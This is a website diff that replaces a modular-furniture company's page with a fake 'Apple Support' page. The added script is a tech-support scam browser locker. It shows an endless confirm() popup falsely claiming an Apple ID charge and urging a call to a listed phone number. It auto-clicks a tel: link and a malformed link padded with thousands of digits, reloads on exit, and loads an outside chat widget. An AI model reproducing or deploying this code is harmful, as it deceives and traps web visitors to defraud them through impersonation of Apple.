+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
 
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
 
-<section class="head-section container-padding">
-    <div class="head-container container-margin">
-      <div class="head-text-btn">
-        <h1>Welcome to Sovenaezra, your trusted partner in modular furniture manufacturing. We specialize in creating high-quality, customizable furniture solutions designed to meet your unique needs. Explore our innovative designs and durable products that transform your spaces with style and functionality.</h1>
-        
-      </div>
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
     </div>
-</section>
 
-            
-
-
-<section class="benefits-section">
-  <div class="benefits-container container-margin">
-          
-            
-  <div class="benefits-list">
-    <div class="benefit-card">
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
-        <path d="M184 48l144 0c4.4 0 8 3.6 8 8l0 40L176 96l0-40c0-4.4 3.6-8 8-8zm-56 8l0 40L64 96C28.7 96 0 124.7 0 160l0 96 192 0 160 0 8.2 0c32.3-39.1 81.1-64 135.8-64c5.4 0 10.7 .2 16 .7l0-32.7c0-35.3-28.7-64-64-64l-64 0 0-40c0-30.9-25.1-56-56-56L184 0c-30.9 0-56 25.1-56 56zM320 352l-96 0c-17.7 0-32-14.3-32-32l0-32L0 288 0 416c0 35.3 28.7 64 64 64l296.2 0C335.1 449.6 320 410.5 320 368c0-5.4 .2-10.7 .7-16l-.7 0zm320 16a144 144 0 1 0 -288 0 144 144 0 1 0 288 0zM496 288c8.8 0 16 7.2 16 16l0 48 32 0c8.8 0 16 7.2 16 16s-7.2 16-16 16l-48 0c-8.8 0-16-7.2-16-16l0-64c0-8.8 7.2-16 16-16z"/>
-      </svg>
-    <p class="reason-text">Customizable Designs Our modular furniture can be tailored to your specific preferences, allowing you to create spaces that truly reflect your style and needs.</p>
-    </div>
-    <div class="benefit-card">
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
-        <path d="M112 0C85.5 0 64 21.5 64 48l0 48L16 96c-8.8 0-16 7.2-16 16s7.2 16 16 16l48 0 208 0c8.8 0 16 7.2 16 16s-7.2 16-16 16L64 160l-16 0c-8.8 0-16 7.2-16 16s7.2 16 16 16l16 0 176 0c8.8 0 16 7.2 16 16s-7.2 16-16 16L64 224l-48 0c-8.8 0-16 7.2-16 16s7.2 16 16 16l48 0 144 0c8.8 0 16 7.2 16 16s-7.2 16-16 16L64 288l0 128c0 53 43 96 96 96s96-43 96-96l128 0c0 53 43 96 96 96s96-43 96-96l32 0c17.7 0 32-14.3 32-32s-14.3-32-32-32l0-64 0-32 0-18.7c0-17-6.7-33.3-18.7-45.3L512 114.7c-12-12-28.3-18.7-45.3-18.7L416 96l0-48c0-26.5-21.5-48-48-48L112 0zM544 237.3l0 18.7-128 0 0-96 50.7 0L544 237.3zM160 368a48 48 0 1 1 0 96 48 48 0 1 1 0-96zm272 48a48 48 0 1 1 96 0 48 48 0 1 1 -96 0z"/>
-      </svg>
-    <p class="reason-text">High-Quality Materials We use only premium, sustainable materials to ensure durability, safety, and environmental responsibility in every product.</p>
-    </div>
-    <div class="benefit-card">
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
-        <path d="M480 48c0-26.5-21.5-48-48-48L336 0c-26.5 0-48 21.5-48 48l0 48-64 0 0-72c0-13.3-10.7-24-24-24s-24 10.7-24 24l0 72-64 0 0-72c0-13.3-10.7-24-24-24S64 10.7 64 24l0 72L48 96C21.5 96 0 117.5 0 144l0 96L0 464c0 26.5 21.5 48 48 48l256 0 32 0 96 0 160 0c26.5 0 48-21.5 48-48l0-224c0-26.5-21.5-48-48-48l-112 0 0-144zm96 320l0 32c0 8.8-7.2 16-16 16l-32 0c-8.8 0-16-7.2-16-16l0-32c0-8.8 7.2-16 16-16l32 0c8.8 0 16 7.2 16 16zM240 416l-32 0c-8.8 0-16-7.2-16-16l0-32c0-8.8 7.2-16 16-16l32 0c8.8 0 16 7.2 16 16l0 32c0 8.8-7.2 16-16 16zM128 400c0 8.8-7.2 16-16 16l-32 0c-8.8 0-16-7.2-16-16l0-32c0-8.8 7.2-16 16-16l32 0c8.8 0 16 7.2 16 16l0 32zM560 256c8.8 0 16 7.2 16 16l0 32c0 8.8-7.2 16-16 16l-32 0c-8.8 0-16-7.2-16-16l0-32c0-8.8 7.2-16 16-16l32 0zM256 176l0 32c0 8.8-7.2 16-16 16l-32 0c-8.8 0-16-7.2-16-16l0-32c0-8.8 7.2-16 16-16l32 0c8.8 0 16 7.2 16 16zM112 160c8.8 0 16 7.2 16 16l0 32c0 8.8-7.2 16-16 16l-32 0c-8.8 0-16-7.2-16-16l0-32c0-8.8 7.2-16 16-16l32 0zM256 304c0 8.8-7.2 16-16 16l-32 0c-8.8 0-16-7.2-16-16l0-32c0-8.8 7.2-16 16-16l32 0c8.8 0 16 7.2 16 16l0 32zM112 320l-32 0c-8.8 0-16-7.2-16-16l0-32c0-8.8 7.2-16 16-16l32 0c8.8 0 16 7.2 16 16l0 32c0 8.8-7.2 16-16 16zm304-48l0 32c0 8.8-7.2 16-16 16l-32 0c-8.8 0-16-7.2-16-16l0-32c0-8.8 7.2-16 16-16l32 0c8.8 0 16 7.2 16 16zM400 64c8.8 0 16 7.2 16 16l0 32c0 8.8-7.2 16-16 16l-32 0c-8.8 0-16-7.2-16-16l0-32c0-8.8 7.2-16 16-16l32 0zm16 112l0 32c0 8.8-7.2 16-16 16l-32 0c-8.8 0-16-7.2-16-16l0-32c0-8.8 7.2-16 16-16l32 0c8.8 0 16 7.2 16 16z"/>
-      </svg>
-    <p class="reason-text">Efficient Space Utilization Our designs maximize the use of available space, making your rooms more functional without compromising on aesthetics.</p>
-    </div>
-  </div>
-
-  </div>
-</section>
-
-         
-<section class="about-section container-padding ordercd__label" id="aboutus">
-  <div class="about-container container-margin">
-   <div class="about-block">
-      <img src="media/gallery_q700.webp">
-    <div class="about-text">
-      <h2>About us</h2>
-      <p>At Sovenaezra, we are dedicated to producing top-tier modular furniture that combines innovation, quality, and customization. Our team of experts works tirelessly to design and manufacture furniture that adapts to your lifestyle and space requirements. With state-of-the-art technology and sustainable materials, we ensure each piece meets rigorous standards for durability and aesthetics. We pride ourselves on excellent customer service, timely delivery, and competitive pricing, making Sovenaezra the preferred choice for modular furniture solutions across various settings, from homes to offices.</p>
-    </div>
-            
-  </div>
-  </div>
-</section>
-    
-
-<section class="hero-section container-padding wishlisttu--content">
-  <div class="hero-container container-margin">        
-    <div class="hero-img">
-        <img src="product-images/furniture_93d7b_1.jpg" alt=" Sovenaezra  Home Assembly"/>
-    </div>
-    <div class="hero-title">
-      <h2> Sovenaezra  Home Assembly</h2>
-      <div class="hero-text"><p style="text-align: center;"><strong><span>About Us</span></strong></p>
-<p><span>At </span><strong><span> Sovenaezra </span></strong><span>, we believe that every piece of furniture deserves to be assembled with precision, care, and attention to detail. Our company specializes in professional home furniture assembly and installation services, helping homeowners, tenants, and businesses enjoy a smooth and stress-free experience from the moment their furniture arrives. Whether it is a single item or a complete room setup, our experienced team approaches every project with dedication and craftsmanship. We understand that properly assembled furniture is essential for both comfort and long-term durability, which is why we focus on accuracy, safety, and outstanding customer service. Our goal is to save our clients valuable time while ensuring every item is installed exactly as intended, allowing them to enjoy a functional and beautifully organized living space.</span></p>
-<p><span>Every home is unique, and every customer has different expectations. That is why we tailor our services to the layout of each room, the style of the furniture, and the specific preferences of the homeowner. Our specialists arrive prepared with professional tools and a methodical approach, carefully handling every component throughout the assembly process. From unpacking and organizing parts to the final inspection, we work efficiently while respecting your home and keeping the workspace clean. We value reliability, punctuality, and open communication, making the entire experience convenient from the initial appointment to the completed installation. Our reputation has been built on consistent workmanship and genuine care for customer satisfaction.</span></p>
-<p style="text-align: center;"><strong><span>Our Services</span></strong></p>
-<p><span> Sovenaezra  provides a wide range of furniture assembly and installation solutions designed for modern homes and apartments. Our most popular services include:</span></p>
-<ul>
-<li><span>Complete assembly of bedroom, living room, dining room, and office furniture.</span></li>
-<li><span>Installation and positioning of wardrobes, shelving systems, cabinets, and storage solutions.</span></li>
-<li><span>Secure mounting and adjustment of furniture components for improved stability and functionality.</span></li>
-<li><span>Assembly assistance for newly delivered furniture sets, including room organization and final placement.</span></li>
-</ul>
-<p><span>Each service is carried out with close attention to manufacturer instructions while also considering the practical needs of the household. We carefully inspect every fitting, connection, and moving mechanism to ensure smooth operation and dependable performance. Before finishing each project, our team performs a comprehensive quality check to confirm that everything has been assembled correctly and positioned according to the customer's preferences. By combining technical expertise with careful planning, we help create comfortable interiors that are both attractive and practical for everyday use.</span></p>
-<p style="text-align: center;"><strong><span>Our Approach</span></strong></p>
-<p><span>Our philosophy is centered on professionalism, transparency, and quality craftsmanship. Every project begins with understanding the customer's requirements and evaluating the furniture to be assembled. We believe that careful preparation leads to efficient execution, allowing us to complete projects accurately while minimizing disruption to daily life. Throughout the process, our specialists maintain a tidy work environment, handle furniture with care, and ensure every installation meets high standards of safety and stability.</span></p>
-<p><span>Attention to detail is one of the qualities that distinguishes  Sovenaezra . We recognize that even small adjustments can significantly improve the appearance and usability of furniture. Doors should align perfectly, drawers should glide smoothly, shelves should remain level, and every fastener should be securely tightened. Our experienced team pays close attention to these details because we know they directly influence both comfort and durability. We also value clear communication, providing realistic scheduling, timely arrivals, and courteous service from beginning to end. Customers appreciate our dependable approach because they know their furniture is being assembled by professionals who genuinely care about delivering excellent results.</span></p>
-<p style="text-align: center;"><strong><span>Why Choose  Sovenaezra </span></strong></p>
-<p><span>Choosing  Sovenaezra  means choosing a company that values quality, precision, and customer satisfaction above all else. We understand that purchasing new furniture is an investment, and professional assembly helps protect that investment by ensuring every component functions properly from the very beginning. Our team combines practical experience with a commitment to continuous improvement, allowing us to complete projects efficiently without compromising workmanship. We respect your schedule, treat your home with care, and focus on delivering results that meet your expectations.</span></p>
-<p><span>Many clients choose  Sovenaezra  because they appreciate our dependable service, organized workflow, and attention to every detail. We aim to make furniture assembly simple and worry-free, allowing homeowners to enjoy their new spaces without the frustration of complicated instructions or lengthy installations. Whether you are furnishing a single room, moving into a new home, or updating an entire property, our experienced specialists are ready to provide professional assistance tailored to your needs. At  Sovenaezra , every completed project reflects our commitment to precision, reliability, and exceptional customer care, helping transform furniture into comfortable, functional spaces that are ready to be enjoyed for years to come.</span></p></div>
-       
-    </div>          
-  </div> 
- </section>
-
- <div class="container-flex">
-<section class="history-section container-padding">
- <div class="history-container container-margin">
-   <div class="history-title">
-     <h2>Our Story</h2>
-   </div>
-
-   <div class="history-item-fst">
-    <img class="history-img-top" src="media/gallery_q701.webp">
-    <img class="history-img-bott" src="media/gallery_q702.webp">
-  </div>
-   
-  <div class="history-card-fst">
-    <p>Founded with a vision to revolutionize furniture manufacturing, Sovenaezra began as a small workshop focused on modular design innovations.</p>
-  </div>
-
-  <div class="history-item-scnd">
-    <div class="history-card-scnd">
-      <p>Over the years, we expanded our capabilities by integrating advanced technology and sustainable practices to meet the evolving demands of our clients.</p>
-    </div>
-    <div class="history-card-scnd">
-      <p>Today, Sovenaezra stands as a leader in modular furniture production, committed to delivering exceptional quality and personalized solutions worldwide.</p>
-    </div>
-  </div>
-
- </div>
-</section>
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2026 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-877-481-2417
+			 " property="telephone">
+            </section>
+        </div>
+    </footer>
 
 
 
- </div>
-
-<div class="container-flex">
-
-<section class="gallery-section container-padding">
-  <div class="gallery-container container-margin">
-    <div class="gallery-wrap">
-      <div class="div1">
-        <img src="media/gallery_q703.webp">
-      </div>
-      <div class="div2">
-        <img src="media/gallery_q704.webp">
-      </div>
-      <div class="div3">
-        <img src="media/gallery_q705.webp">
-      </div>
-      <div class="div6">
-        <img src="media/gallery_q706.webp">
-      </div>
-      <div class="div7">
-        <img src="media/gallery_q707.webp">
-      </div>
-  </div>
-  </div>
-</section>
-
-
-
-
-
-</div>
-
-       
- 
-
-      
-        
-    
-
-  <section class="footer-section container-padding">
-      <div class="footer-container container-margin"> 
-
-      <div class="footer-menu">
-      <div class="footer-bottom-logo">
-        <a href="./">
-          <div class="bottom-logo">
-            <img src="logo-icon.png" alt="Logo">
-            <p>Sovenaezra</p>
-          </div>
-        </a>
-      </div>
-
-      <nav class="footer-menu-container">
-        <a href="./">Home</a>
-        <a href="./#aboutus">About us</a>
-        
-        <a href="privacyPolicy.html">Privacy policy</a>
-        <a href="terms-of-service.html">Terms & Conditions</a>
-        <a href="legal-disclaimer.html">Disclaimer</a>
-    </nav>
-  </div>
-
-      </div>
-  </section>
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
 
 
-      
-<script>
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
 
-    const openMenu = document.getElementById('openMenu');
-    const closeMenu = document.getElementById('closeMenu');
-    const menu = document.getElementById('hederMenu');
-    const body = document.body;
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
 
-    openMenu.addEventListener('click', () => {
-      menu.classList.add('active');
-      body.classList.add('no-scroll');
-      openMenu.classList.add('hide');
-      closeMenu.classList.add('show');
-    });
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
 
-    closeMenu.addEventListener('click', () => {
-      menu.classList.remove('active');
-      body.classList.remove('no-scroll');
-      openMenu.classList.remove('hide');
-      closeMenu.classList.remove('show');
-    });
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-877-481-2417');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-877-481-2417"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $249.95 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-877-481-2417 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+
+
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
 </script>
-
-
-
-</body>
-</html>
